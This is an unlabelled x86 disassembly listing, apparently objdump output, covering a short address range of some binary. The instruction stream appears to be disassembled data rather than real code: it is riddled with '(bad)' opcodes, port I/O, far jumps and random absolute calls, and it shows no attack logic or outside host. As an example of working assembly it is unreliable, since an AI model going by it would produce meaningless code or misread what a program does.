  411fd4:	dec    DWORD PTR [ecx+0x64]
  411fd7:	out    0xec,eax
  411fd9:	cwde   
  411fda:	dec    edx
  411fdb:	cmp    al,0xcc
  411fdd:	mov    bl,0x41
  411fdf:	scas   al,BYTE PTR es:[edi]
  411fe0:	dec    esp
  411fe1:	lds    eax,FWORD PTR [ecx+0x28]
  411fe4:	sbb    eax,0x530cbc7c
  411fe9:	push   edi
  411fea:	add    DWORD PTR [eax-0x4e],ecx
  411fed:	pop    esp
  411fee:	les    eax,FWORD PTR [ebx-0x640cc82e]
  411ff4:	xor    esi,esp
  411ff6:	mov    ecx,0xb82e5c52
  411ffb:	(bad)  
  411ffc:	out    dx,eax
  411ffd:	pop    edx
  411ffe:	jmp    0x20e4:0x1523b1a7
  412005:	fiadd  WORD PTR [edi-0x666c19cb]
  41200b:	sub    DWORD PTR [ebx+0x47],edi
  41200e:	or     eax,0xf4a27bba
  412013:	or     al,0xe6
  412015:	ds ss in al,dx
  412018:	ss pop ds
  41201a:	(bad)  
  41201b:	dec    esp
  41201c:	inc    ebx
  41201d:	shl    BYTE PTR [esi-0x6e],0x3
  412021:	add    BYTE PTR [edx],bh
  412023:	mov    bl,0x51
  412025:	int3   
  412026:	(bad)  
  412028:	aad    0xc6
  41202a:	jb     0x411fbf
  41202c:	sti    
  41202d:	inc    edx
  41202e:	out    dx,eax
  41202f:	inc    ecx
  412030:	push   cs
  412031:	add    dl,0x6d
  412034:	sub    DWORD PTR [ebx+0x3d316ff2],ecx
  41203a:	push   cs
  41203b:	push   edi
  41203c:	dec    edx
  41203d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41203e:	gs adc al,0x9
  412041:	mov    ch,0x34
  412043:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412044:	mov    eax,0xcb13d9dd
  412049:	xchg   ecx,ebp
  41204b:	mov    edi,0x998aea7a
  412050:	(bad)
  412054:	mov    ch,0xbf
  412056:	dec    eax
  412057:	sbb    ah,bl
  412059:	mov    al,ds:0xae6cc1bb
  41205e:	jne    0x412099
  412060:	stc    
  412061:	push   0x3e4db0b0
  412066:	popa   
  412067:	or     ch,dl
  412069:	das    
  41206a:	cmp    DWORD PTR [edi],ebx
  41206c:	mov    ecx,0x9d5c7b3d
  412071:	stos   DWORD PTR es:[edi],eax
  412072:	std    
  412073:	aaa    
  412074:	addr16 mov edi,0x9a6afa2c
  41207a:	jns    0x4120e0
  41207c:	nop
  41207d:	jne    0x412057
  41207f:	or     DWORD PTR [ebp-0x567d543],ebp
  412085:	or     DWORD PTR [ebx],ebp
  412087:	(bad)
  41208c:	loope  0x4120a2
  41208e:	or     BYTE PTR [edi],cl
  412090:	in     eax,0xed
  412092:	dec    edi
  412093:	xchg   ebx,eax
  412094:	pop    edi
  412095:	aaa    
  412096:	cwde   
  412097:	out    0xe0,al
  412099:	test   BYTE PTR [ebx-0x619a460],0x6d
  4120a0:	in     eax,dx
  4120a1:	xchg   edi,eax
  4120a3:	mov    al,0x1a
  4120a5:	xor    DWORD PTR [ecx-0x41],esp
  4120a8:	mov    al,ds:0x860c12d5
  4120ad:	push   ds
  4120ae:	mov    edx,0x4adbe7a
  4120b3:	int3   
  4120b4:	(bad)  
  4120b5:	repnz xlat BYTE PTR ds:[ebx]
  4120b7:	pop    ds
  4120b8:	in     al,dx
  4120b9:	int3   
  4120ba:	jne    0x412057
  4120bc:	jb     0x4120ae
  4120be:	push   ebp
  4120bf:	scas   al,BYTE PTR es:[edi]
  4120c0:	in     eax,dx
  4120c1:	sub    esi,edi
  4120c3:	neg    ch
  4120c5:	repz adc al,0xed
  4120c8:	pop    edi
  4120c9:	mov    ebx,0x9ba0e216
  4120ce:	out    0x76,eax
  4120d0:	(bad)  
  4120d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120d2:	inc    eax
  4120d3:	lock cld 
  4120d5:	jmp    0x412092
  4120d7:	aas    
  4120d8:	nop
  4120d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120da:	jmp    0x49789e99
  4120df:	dec    edx
  4120e0:	push   eax
  4120e1:	xlat   BYTE PTR ds:[ebx]
  4120e2:	ins    DWORD PTR es:[edi],dx
  4120e3:	mov    ebp,0x7bb3d207
  4120e8:	mov    ds:0xf0fbf224,eax
  4120ed:	mov    edi,0x924f2157
  4120f2:	dec    esp
  4120f3:	lock js 0x41209d
  4120f6:	aas    
  4120f7:	add    ebp,DWORD PTR [eax]
  4120f9:	mov    ?,WORD PTR [edi-0x380d7f83]
  4120ff:	jge    0x412123
  412101:	mov    WORD PTR [edx-0x2a85870d],ss
  412107:	shl    DWORD PTR [eax+0x36],1
  41210a:	daa    
  41210b:	cmp    bh,BYTE PTR [ecx+edx*4+0x38]
  41210f:	dec    edx
  412110:	and    DWORD PTR [edi],edx
  412112:	or     edi,DWORD PTR [eax+0x758a3e81]
  412118:	aas    
  412119:	jae    0x412118
  41211b:	loop   0x412186
  41211d:	mov    eax,ds:0xcf13ea12
  412122:	xchg   esp,eax
  412123:	xor    al,0x90
  412125:	outs   dx,DWORD PTR ds:[esi]
  412126:	jg     0x41213c
  412128:	xor    bh,BYTE PTR [edi-0x83939e0]
  41212e:	jecxz  0x412190
  412130:	sub    al,0x29
  412132:	call   0x602ddce0
  412137:	jl     0x412178
  412139:	cdq    
  41213a:	and    eax,eax
  41213c:	cmp    eax,0x29e1fd3
  412141:	adc    BYTE PTR [ecx-0x3d],bl
  412144:	adc    dh,BYTE PTR [esi-0x6e]
  412147:	dec    esp
  412148:	cdq    
  412149:	(bad)  
  41214a:	std    
  41214b:	xchg   ebp,eax
  41214c:	lods   eax,DWORD PTR ds:[esi]
  41214d:	push   0xe7179c3f
  412152:	mov    esp,0x1e73425a
  412157:	or     bh,BYTE PTR [edx+0x1664c2c1]
  41215d:	test   DWORD PTR [eax],ebx
  41215f:	jmp    0xa47d4317
  412164:	lods   al,BYTE PTR ds:[esi]
  412165:	stos   DWORD PTR es:[edi],eax
  412166:	sahf   
  412167:	shl    DWORD PTR ds:[ebx+0x43],cl
  41216b:	(bad)  
  41216d:	dec    ebx
  41216e:	and    DWORD PTR ds:0x89060fb3,edi
  412174:	xchg   edx,eax
  412175:	pop    ebx
  412176:	int3   
  412177:	push   ebx
  412178:	call   0x9d92:0x2aff1e4
  41217f:	(bad)  
  412181:	in     eax,0xe3
  412183:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412184:	sbb    ebp,DWORD PTR [ebp-0x7d9a2bb0]
  41218a:	retf   
  41218b:	(bad)  
  41218c:	call   0x801a8cc1
  412191:	mov    dh,cl
  412193:	xchg   dl,dl
  412195:	pop    ebx
  412196:	test   al,0xbd
  412198:	clc    
  412199:	mov    ch,0x82
  41219b:	outs   dx,BYTE PTR ds:[esi]
  41219c:	cmp    bh,BYTE PTR [esi]
  41219e:	jo     0x4121ea
  4121a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121a1:	mov    eax,gs:0xacf8e80
  4121a7:	push   edx
  4121a8:	cmp    BYTE PTR [ecx],dl
  4121aa:	cmp    DWORD PTR [esi+0x62b02fed],0x748dc
  4121b4:	lds    eax,FWORD PTR [edi]
  4121b6:	out    dx,eax
  4121b7:	fld    DWORD PTR [esi*1+0x2a487588]
  4121be:	sub    cl,BYTE PTR [edx]
  4121c0:	scas   eax,DWORD PTR es:[edi]
  4121c1:	adc    dl,BYTE PTR [eax+edi*1]
  4121c4:	push   eax
  4121c5:	sub    bh,al
  4121c7:	push   edi
  4121c8:	mov    edx,0x4c39e831
  4121cd:	fs mov ebx,0xba632ff8
  4121d3:	mov    al,0x75
  4121d5:	into   
  4121d6:	ret    0x9d2
  4121d9:	mov    al,ds:0x2e89354e
  4121de:	mov    DWORD PTR ds:0x5e8cb030,ebx
  4121e4:	sti    
  4121e5:	int    0x50
  4121e7:	(bad)  
  4121e8:	mov    cl,dh
  4121ea:	dec    eax
  4121ec:	(bad)  
  4121ed:	sub    DWORD PTR [eax],esp
  4121ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121f0:	lahf   
  4121f1:	jbe    0x412195
  4121f3:	popf   
  4121f4:	nop
  4121f5:	jae    0x412177
  4121f7:	or     eax,esi
  4121f9:	stc    
  4121fa:	rol    BYTE PTR [ecx+edi*2-0x22],0x8d
  4121ff:	je     0x412206
  412201:	sub    DWORD PTR ds:0xc8ede863,0x4d
  412208:	jg     0x412266
  41220a:	cld    
  41220b:	xchg   BYTE PTR [edi],al
  41220d:	js     0x4121b8
  41220f:	add    edi,DWORD PTR [eax]
  412211:	xlat   BYTE PTR ds:[ebx]
  412212:	mov    eax,ds:0x5f557fc5
  412217:	push   esi
  412218:	jnp    0x412212
  41221a:	push   edx
  41221b:	mov    eax,0x4c9debd7
  412220:	jle    0x4121d8
  412222:	sub    ebx,DWORD PTR [ecx]
  412224:	out    0xd4,al
  412226:	push   eax
  412227:	mov    bl,BYTE PTR [eax]
  412229:	jmp    0xd74c:0x3178879a
  412230:	sbb    eax,0xc634fd43
  412235:	(bad)  
  412236:	pop    esi
  412237:	enter  0xf126,0x12
  41223b:	retf   0xae2f
  41223e:	xor    DWORD PTR [edx-0x77],ecx
  412241:	(bad)  
  412243:	cmc    
  412244:	and    BYTE PTR [ebx],bh
  412246:	fisub  DWORD PTR [edx]
  412248:	in     eax,dx
  412249:	mov    dh,0x37
  41224b:	stc    
  41224c:	jl     0x41224c
  41224e:	cli    
  41224f:	push   edx
  412250:	inc    ebx
  412251:	xor    eax,0x527f8139
  412256:	mov    al,ds:0xc9652007
  41225b:	mov    esi,0x85b09889
  412260:	popf   
  412261:	adc    edi,DWORD PTR [ecx-0x7a828f70]
  412267:	test   BYTE PTR [edi+0x7b6e541f],ch
  41226d:	or     ebp,edi
  41226f:	outs   dx,DWORD PTR ds:[esi]
  412270:	ret    0x1330
  412273:	(bad)  
  412274:	loope  0x412221
  412276:	xchg   DWORD PTR ds:0xd1479d95,eax
  41227c:	fild   WORD PTR [eax+0x30]
  41227f:	adc    eax,DWORD PTR [edi+0x62a2f86a]
  412285:	stos   DWORD PTR es:[edi],eax
  412286:	idiv   DWORD PTR [ebp+0x4]
  412289:	push   eax
  41228a:	pop    esp
  41228b:	sub    al,0xb2
  41228d:	scas   al,BYTE PTR es:[edi]
  41228e:	push   ecx
  41228f:	xor    al,0x79
  412291:	sub    ebp,DWORD PTR [eax-0x38]
  412294:	fxch   st(5)
  412296:	xchg   DWORD PTR [ebx+0x29e15fea],eax
  41229c:	jne    0x4122fc
  41229e:	or     esp,DWORD PTR [edx-0x56adb758]
  4122a4:	or     al,0xfc
  4122a6:	cmp    eax,0x8ec257e6
  4122ab:	pop    edx
  4122ac:	fstp   TBYTE PTR ds:0xbcc215f7
  4122b2:	xchg   edi,eax
  4122b3:	test   BYTE PTR [eax],dl
  4122b5:	sub    bh,ch
  4122b7:	mov    dh,0x62
  4122b9:	sbb    BYTE PTR [eax+ebp*1+0x183a300f],bh
  4122c0:	jbe    0x4122f0
  4122c2:	inc    edi
  4122c3:	fidiv  DWORD PTR [esi+0xb8d494]
  4122c9:	sub    ah,BYTE PTR [edi+0x3e10b2f5]
  4122cf:	cmp    al,0x25
  4122d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122d2:	ja     0x4122fb
  4122d4:	mov    al,ds:0x195fd507
  4122d9:	mov    esp,0x25f35ac8
  4122de:	adc    esi,DWORD PTR [ecx]
  4122e0:	adc    al,0xc
  4122e2:	mov    ebp,esp
  4122e4:	pop    es
  4122e5:	daa    
  4122e6:	or     DWORD PTR [edx],ebp
  4122e8:	jnp    0x41233c
  4122ea:	push   edx
  4122eb:	je     0x4122bc
  4122ed:	je     0x412336
  4122ef:	mov    ebp,0x607eafab
  4122f4:	inc    eax
  4122f5:	push   ss
  4122f6:	shl    eax,0x2f
  4122f9:	add    al,dh
  4122fb:	les    esp,FWORD PTR [edi]
  4122fd:	leave  
  4122fe:	stos   BYTE PTR es:[edi],al
  4122ff:	push   cs
  412300:	dec    ecx
  412301:	stos   BYTE PTR es:[edi],al
  412302:	xor    eax,0x4b28e855
  412307:	mov    bh,0x6a
  412309:	jecxz  0x41231b
  41230b:	inc    edi
  41230c:	push   edi
  41230d:	push   ss
  41230e:	xchg   esp,eax
  41230f:	and    BYTE PTR [ebx-0x1b],cl
  412312:	pop    edi
  412313:	into   
  412314:	loope  0x4122fb
  412316:	mov    eax,0x492b8be1
  41231b:	inc    ebp
  41231c:	sbb    al,0x52
  41231e:	mov    ebp,0x8d3ee533
  412323:	inc    edi
  412324:	and    bl,0xa0
  412327:	push   ebp
  412328:	jo     0x412362
  41232a:	mov    al,0xf5
  41232c:	fwait
  41232d:	jecxz  0x412348
  41232f:	xchg   ecx,eax
  412330:	add    BYTE PTR [ebx+0x6afdd9e4],al
  412336:	ja     0x4122f5
  412338:	in     eax,dx
  412339:	inc    edx
  41233a:	hlt    
  41233b:	call   DWORD PTR [eax+ebx*4-0x4e]
  41233f:	push   cs
  412340:	sub    eax,0xdb46e876
  412345:	add    BYTE PTR [ebx+0xb],ah
  412348:	pop    edx
  412349:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41234a:	mov    ch,0xc6
  41234c:	dec    ecx
  41234d:	call   0xbed5b92
  412352:	xchg   ecx,eax
  412353:	icebp  
  412354:	or     al,0x88
  412356:	mov    bl,0x57
  412358:	arpl   WORD PTR [esi+0x5563bd8e],bp
  41235e:	ins    DWORD PTR es:[edi],dx
  41235f:	vpshad xmm5,xmm6,xmm7
  412364:	mov    edi,0x10a954a9
  412369:	mov    ch,0x79
  41236b:	shl    BYTE PTR [ecx+edi*1-0x14],0xa9
  412370:	adc    dl,ch
  412372:	inc    ebp
  412373:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412374:	fbstp  TBYTE PTR [esi-0x46]
  412377:	sahf   
  412378:	jo     0x412399
  41237a:	xor    eax,0x73d9fe38
  41237f:	jne    0x41234e
  412381:	cdq    
  412382:	add    DWORD PTR [esi],esi
  412384:	test   ax,0xe64e
  412388:	sub    BYTE PTR fs:[esi+0x68],ch
  41238c:	and    dh,ah
  41238e:	shr    dh,cl
  412390:	lds    edx,FWORD PTR [ebx]
  412392:	add    al,0x61
  412394:	outs   dx,BYTE PTR ds:[esi]
  412395:	xchg   esp,eax
  412396:	clc    
  412397:	mov    eax,0xa82ce301
  41239c:	cld    
  41239d:	or     al,0xdc
  4123a0:	pop    es
  4123a1:	cmp    ah,dh
  4123a3:	jmp    0x2f47:0xfe5b70b
  4123aa:	clc    
  4123ab:	call   0xff1e:0xcce2ab06
  4123b2:	jmp    0x5d1a3175
  4123b7:	jnp    0x41237c
  4123b9:	inc    edi
  4123ba:	cmp    bl,BYTE PTR ss:[edi+0x51a1b7eb]
  4123c1:	loopne 0x412355
  4123c3:	aas    
  4123c4:	dec    eax
  4123c5:	and    al,0xa3
  4123c7:	sub    al,0xf2
  4123c9:	dec    esp
  4123ca:	mov    DWORD PTR [edi-0x21],esi
  4123cd:	int    0x52
  4123cf:	(bad)  
  4123d0:	cli    
  4123d1:	ss dec esi
  4123d3:	fwait
  4123d4:	and    eax,0x1f722a88
  4123d9:	inc    edi
  4123da:	jne    0x41236a
  4123dc:	inc    ebx
  4123dd:	or     cl,al
  4123df:	cmc    
  4123e0:	mov    esp,0x8f8cdef3
  4123e5:	jo     0x41239e
  4123e7:	rcr    BYTE PTR [edx],0x95
  4123ea:	(bad)  
  4123eb:	hlt    
  4123ec:	pushf  
  4123ed:	pop    ebp
  4123ee:	add    al,BYTE PTR [edx+0x24]
  4123f1:	add    al,0xd9
  4123f3:	fwait
  4123f4:	dec    esi
  4123f5:	addr16 xor eax,0x7b653d24
  4123fb:	ror    BYTE PTR [edx-0x4d6d482d],cl
  412401:	cmp    ebx,esp
  412403:	lahf   
  412404:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412405:	icebp  
  412406:	sub    al,0xf1
  412408:	push   es
  412409:	cmp    BYTE PTR [ebx],dh
  41240b:	test   al,0x3f
  41240d:	fwait
  41240e:	push   es
  41240f:	sub    eax,0xeefbc900
  412414:	lock and eax,ebp
  412417:	jp     0x412498
  412419:	jnp    0x412438
  41241b:	lods   al,BYTE PTR ds:[esi]
  41241c:	cmp    DWORD PTR [eax-0x13],ecx
  41241f:	bound  esi,QWORD PTR [bx+si]
  412422:	mov    ds:0x951ba5f8,al
  412427:	gs push 0x61
  41242a:	test   al,0x95
  41242c:	daa    
  41242d:	in     al,dx
  41242e:	(bad)  
  41242f:	pop    ds
  412430:	mov    eax,0x49584962
  412435:	and    BYTE PTR [edx],bl
  412437:	jbe    0x412411
  412439:	adc    eax,0xf5ee9d6f
  41243e:	stos   BYTE PTR es:[edi],al
  41243f:	mov    esp,0xd2dea265
  412444:	rep outs dx,BYTE PTR ds:[esi]
  412446:	xchg   esp,eax
  412447:	stos   BYTE PTR es:[edi],al
  412448:	fnstenv [ebx]
  41244a:	adc    DWORD PTR [esi],eax
  41244c:	cmc    
  41244d:	stc    
  41244e:	cmp    DWORD PTR [eax+0x38],ebp
  412451:	cmc    
  412452:	sti    
  412453:	dec    di
  412455:	cld    
  412456:	test   al,0xa4
  412458:	sub    ch,cl
  41245a:	das    
  41245b:	and    eax,0xe7db691c
  412460:	iret   
  412461:	sub    dl,BYTE PTR [edi]
  412463:	jge    0x412450
  412465:	push   0xe4be1b92
  41246a:	(bad)  
  41246b:	xor    ah,al
  41246d:	adc    DWORD PTR [eax+0x56],ecx
  412470:	and    al,0x43
  412472:	cmc    
  412473:	jno    0x41240f
  412475:	aam    0x4e
  412477:	pop    esi
  412478:	test   DWORD PTR [esi-0x31445c72],ecx
  41247e:	dec    ebx
  41247f:	rol    BYTE PTR [eax],1
  412481:	dec    ebx
  412482:	sub    DWORD PTR [edx+0x1d],edx
  412485:	jmp    0x4124a5
  412487:	push   edi
  412488:	aad    0x40
  41248a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41248b:	aad    0x5a
  41248d:	(bad)  
  41248f:	mov    BYTE PTR [edi],0x21
  412492:	stc    
  412493:	pop    es
  412494:	xchg   ebp,eax
  412495:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412496:	pusha  
  412497:	or     DWORD PTR [esi],esi
  412499:	std    
  41249a:	or     BYTE PTR [edx-0x3c40d986],0xd6
  4124a1:	dec    edx
  4124a2:	inc    ebp
  4124a3:	mov    ds:0x178e90ce,al
  4124a8:	sbb    ah,BYTE PTR [esi]
  4124aa:	lahf   
  4124ab:	out    0x5d,al
  4124ad:	or     al,cl
  4124af:	ja     0x412469
  4124b1:	mov    edi,DWORD PTR [edx]
  4124b3:	cli    
  4124b4:	xchg   ebx,eax
  4124b5:	push   edi
  4124b6:	cdq    
  4124b7:	mov    ds:0x30617a19,al
  4124bc:	sub    DWORD PTR [edx+eiz*1-0x57d6c5be],0xaf6a7a9a
  4124c7:	aas    
  4124c8:	fmul   QWORD PTR [ecx-0xc]
  4124cb:	imul   ebp,eax,0xa1f1dd37
  4124d1:	sub    DWORD PTR [ecx],0x18
  4124d4:	mov    esi,0xc57b3bb2
  4124d9:	add    edx,DWORD PTR [ebp-0x5d]
  4124dc:	jo     0x41252e
  4124de:	ins    BYTE PTR es:[edi],dx
  4124df:	pushf  
  4124e0:	mov    ds:0xc333480,al
  4124e5:	lds    esp,FWORD PTR [edx-0xb]
  4124e8:	data16 fild DWORD PTR [edi]
  4124eb:	inc    esi
  4124ec:	mov    edx,0xd9dd54b3
  4124f1:	(bad)  [eax]
  4124f3:	dec    ebx
  4124f4:	mov    cl,ah
  4124f6:	sub    DWORD PTR [ebx+0x62933930],0xd9f5468c
  412500:	jmp    0x4a43fc15
  412505:	sbb    BYTE PTR [ebp+0x55659aa1],ah
  41250b:	arpl   WORD PTR [eax+0x707ff438],si
  412511:	push   0x93558d4b
  412516:	(bad)  
  412517:	mov    DWORD PTR [ebx],ebp
  412519:	inc    ecx
  41251a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41251b:	pop    esp
  41251c:	sbb    esi,esi
  41251e:	ins    BYTE PTR es:[edi],dx
  41251f:	adc    edi,DWORD PTR [edx-0x3e0a2048]
  412525:	in     al,0x36
  412527:	data16 or al,0x20
  41252a:	sar    DWORD PTR [edx-0x705b6b3f],0x41
  412531:	in     eax,0x17
  412533:	scas   eax,DWORD PTR es:[edi]
  412534:	sbb    BYTE PTR [eax+0xc],al
  412537:	mov    DWORD PTR [esi],eax
  412539:	(bad)  
  41253a:	mov    bh,dl
  41253c:	or     BYTE PTR [edi],ch
  41253e:	push   edi
  41253f:	(bad)  
  412540:	pop    eax
  412541:	icebp  
  412542:	pop    ss
  412543:	ret    0x8bee
  412546:	mov    eax,0xb047e52c
  41254b:	push   edi
  41254c:	dec    edi
  41254d:	push   ecx
  41254f:	jg     0x412539
  412551:	scas   al,BYTE PTR es:[edi]
  412552:	fld    TBYTE PTR ds:0xab39cbfd
  412558:	out    dx,al
  412559:	cmp    bl,cl
  41255b:	mov    al,ds:0xa1421a0b
  412560:	pop    ecx
  412561:	mov    ebp,eax
  412563:	sub    DWORD PTR [ecx+edx*8+0x35b5a28a],ebp
  41256a:	mov    esp,0x8ce18b2a
  41256f:	cwde   
  412570:	ror    BYTE PTR [esi+edx*2],0xbf
  412574:	inc    ebx
  412575:	adc    ebx,DWORD PTR [eax-0x7a]
  412578:	shl    BYTE PTR [eax+0x40c17eb9],cl
  41257e:	jmp    0x36f9:0xc04333cb
  412585:	xchg   edi,eax
  412586:	(bad)  
  412587:	outs   dx,DWORD PTR ds:[esi]
  412588:	push   cs
  412589:	pop    ds
  41258a:	fucomp st(3)
  41258c:	ficom  DWORD PTR cs:[eax-0x64]
  412590:	mov    eax,0x5d9cea2e
  412595:	vcmpsd xmm0,xmm6,QWORD PTR [ebx+0x3aa7c86],0x89
  41259e:	pop    ebp
  41259f:	sub    ah,BYTE PTR [esi+0x5d]
  4125a2:	and    eax,0xda183c58
  4125a7:	ret    0x5e33
  4125aa:	xchg   BYTE PTR [edx],dh
  4125ac:	es lock jg 0x412564
  4125b0:	lahf   
  4125b1:	stos   DWORD PTR es:[edi],eax
  4125b2:	pop    edi
  4125b3:	adc    esi,eax
  4125b5:	ror    al,1
  4125b7:	mov    fs,ebp
  4125b9:	dec    esi
  4125ba:	stc    
  4125bb:	(bad)  
  4125bc:	arpl   WORD PTR [ebp+esi*2+0x38ed5a6e],ax
  4125c3:	pop    ecx
  4125c4:	out    dx,eax
  4125c5:	push   0x1dbc8034
  4125ca:	push   0x93ad9953
  4125cf:	adc    ah,bh
  4125d1:	(bad)  [ebp+0x11]
  4125d4:	push   0xeb72e33e
  4125d9:	sti    
  4125da:	pop    edx
  4125db:	mov    ds:0x6094ca1,eax
  4125e0:	push   es
  4125e1:	and    al,0x14
  4125e3:	(bad)  
  4125e4:	arpl   WORD PTR [edx],di
  4125e6:	push   ebp
  4125e7:	retf   
  4125e8:	aaa    
  4125e9:	dec    esp
  4125ea:	cli    
  4125eb:	pop    ebp
  4125ec:	leave  
  4125ed:	ss push esp
  4125ef:	fwait
  4125f0:	inc    esp
  4125f1:	(bad)  
  4125f2:	xchg   esp,eax
  4125f3:	pop    es
  4125f4:	nop
  4125f5:	push   0xb9f5c459
  4125fa:	inc    edx
  4125fb:	mov    bh,0x5e
  4125fd:	shr    BYTE PTR ds:0x729e6f66,1
  412603:	cmp    eax,DWORD PTR [edx+0x771e08cb]
  412609:	cmp    BYTE PTR [ebp-0x7727015d],bl
  41260f:	mov    WORD PTR [edi+0x4c],gs
  412612:	scas   al,BYTE PTR es:[edi]
  412613:	fwait
  412614:	cwde   
  412615:	adc    eax,0xbfbe6bc0
  41261a:	je     0x412697
  41261c:	scas   eax,DWORD PTR es:[edi]
  41261d:	scas   al,BYTE PTR es:[edi]
  41261e:	sbb    al,0xf7
  412620:	mov    bl,0x5b
  412622:	add    DWORD PTR [edx-0x2a],0x7c
  412626:	ds test eax,0x5f3cc617
  41262c:	popa   
  41262d:	xchg   ecx,eax
  41262e:	inc    eax
  41262f:	jle    0x412631
  412631:	int    0xab
  412633:	cmc    
  412634:	or     eax,0x22137b70
  412639:	pop    edx
  41263a:	jg     0x4125d7
  41263c:	adc    BYTE PTR [eax+0x57c85a49],bl
  412642:	test   al,0xa7
  412644:	jo     0x4125e3
  412646:	jmp    0x412695
  412648:	cdq    
  412649:	and    bh,bl
  41264b:	or     dh,BYTE PTR [esi]
  41264d:	adc    eax,0xe4979613
  412653:	mov    BYTE PTR [eax+0xf9e866a],cl
  412659:	pop    edi
  41265a:	cmp    esp,eax
  41265c:	adc    bl,cl
  41265e:	sbb    al,0xa7
  412660:	lock jecxz 0x4126b2
  412663:	call   FWORD PTR [esi+0x2e635933]
  412669:	push   ecx
  41266a:	rol    BYTE PTR [edi],1
  41266c:	jmp    0x5be2:0xfe3392e0
  412673:	mov    eax,ds:0x1cfaeccc
  412678:	mov    ch,0x31
  41267a:	pusha  
  41267b:	cmp    DWORD PTR [ebp+esi*2+0x7cf836b3],eax
  412682:	sar    BYTE PTR [edi],0xe9
  412685:	das    
  412686:	adc    ebp,esp
  412688:	xor    BYTE PTR [esi+0x11],cl
  41268b:	adc    BYTE PTR [esp+esi*4+0x35],ah
  41268f:	mov    edi,0x6dcb5182
  412694:	cs cmp al,0xd4
  412697:	outs   dx,BYTE PTR ds:[esi]
  412698:	mov    ecx,0xb697f80e
  41269d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41269e:	int    0xc4
  4126a0:	fwait
  4126a1:	mov    esp,0x32ddd6f9
  4126a6:	xor    eax,0x78ac9ee6
  4126ab:	add    DWORD PTR [ebx-0x35],esp
  4126ae:	int    0x54
  4126b0:	(bad)  
  4126b2:	and    eax,0x9c2fc3b1
  4126b7:	jne    0x4126f6
  4126b9:	pop    edx
  4126ba:	in     al,0x18
  4126bc:	mov    dl,0x5b
  4126be:	scas   al,BYTE PTR es:[edi]
  4126bf:	inc    ecx
  4126c0:	mov    ch,0xdf
  4126c2:	sub    ebx,eax
  4126c4:	jp     0x412670
  4126c6:	or     dl,BYTE PTR [esi]
  4126c8:	ins    BYTE PTR es:[edi],dx
  4126c9:	and    DWORD PTR [edx],esi
  4126cb:	push   edi
  4126cc:	mov    esp,0xf2c84c57
  4126d1:	cli    
  4126d2:	and    ah,BYTE PTR [ebp+eiz*4-0x680cf6dc]
  4126d9:	xchg   ah,bl
  4126db:	cmp    BYTE PTR [ecx+eax*4-0x76c6a243],bh
  4126e2:	cld    
  4126e3:	mov    al,ds:0x66ada249
  4126e8:	add    bl,BYTE PTR [ebx]
  4126ea:	inc    edx
  4126eb:	or     edi,esp
  4126ed:	sbb    ch,BYTE PTR [ecx+0x49]
  4126f0:	pop    edx
  4126f1:	fidivr DWORD PTR [ebx]
  4126f3:	loope  0x41269c
  4126f5:	leave  
  4126f6:	mov    WORD PTR [eax-0x14],ds
  4126f9:	jl     0x4126e0
  4126fb:	or     al,0xd1
  4126fd:	scas   eax,DWORD PTR es:[edi]
  4126fe:	shl    BYTE PTR [eax+esi*2-0x48],0x79
  412703:	cmp    DWORD PTR [eax*4+0x1f3997ad],esp
  41270a:	rol    DWORD PTR ds:0xf8a6ddd3,0xa0
  412711:	mov    esi,0xb2a7d103
  412716:	test   eax,0xb6e7a2a4
  41271b:	(bad)  
  41271d:	aaa    
  41271e:	adc    ebp,edx
  412720:	inc    ebx
  412721:	int    0x7e
  412723:	lahf   
  412724:	cld    
  412725:	lahf   
  412726:	fs inc edi
  412728:	cmp    edx,DWORD PTR ds:0x302ddf40
  41272e:	sub    al,0x41
  412730:	shr    DWORD PTR [ecx+0x2de65d2f],1
  412736:	call   0xdc2b4f16
  41273b:	cmp    dl,BYTE PTR [ebp+0x53]
  41273e:	add    eax,0x1de37f34
  412743:	cdq    
  412744:	fnclex 
  412746:	jae    0x412790
  412748:	retf   0xec0f
  41274b:	stos   DWORD PTR es:[edi],eax
  41274c:	mov    ah,0xf
  41274e:	mov    DWORD PTR [ebp+0x7e032ecf],ebx
  412754:	sub    DWORD PTR [esi],esp
  412756:	retf   0xca31
  412759:	xchg   ecx,eax
  41275a:	sub    BYTE PTR [esp+edx*8+0xba189b2],dh
  412761:	adc    al,0x3c
  412763:	push   esi
  412764:	dec    ebp
  412765:	ja     0x41273c
  412767:	dec    ebp
  412768:	aaa    
  412769:	(bad)  
  41276a:	xor    DWORD PTR [edi+0x42bbeedc],edx
  412770:	xchg   esi,eax
  412771:	add    al,BYTE PTR [eax]
  412773:	test   BYTE PTR [edi+0x7e],dl
  412776:	inc    ebp
  412777:	(bad)  
  412778:	or     esp,DWORD PTR [ebp-0x15]
  41277b:	mov    ch,0x66
  41277d:	scas   al,BYTE PTR es:[edi]
  41277e:	stc    
  41277f:	push   ebp
  412780:	loop   0x412717
  412782:	mov    esp,0x272d0708
  412787:	(bad)  
  41278a:	add    bh,al
  41278c:	cmp    dl,0x6a
  41278f:	nop
  412790:	xor    cl,bl
  412792:	cmp    bh,BYTE PTR [esi+0x78]
  412795:	out    dx,eax
  412796:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412798:	lock lods al,BYTE PTR ds:[esi]
  41279a:	pusha  
  41279b:	cli    
  41279c:	ret    
  41279d:	mov    dh,0xcb
  41279f:	push   ebp
  4127a0:	out    dx,al
  4127a1:	mov    ecx,0x206b0555
  4127a6:	cli    
  4127a7:	popf   
  4127a8:	aaa    
  4127a9:	and    BYTE PTR [ecx],ch
  4127ab:	sub    al,0xf3
  4127ad:	sub    BYTE PTR [edx+eax*4],al
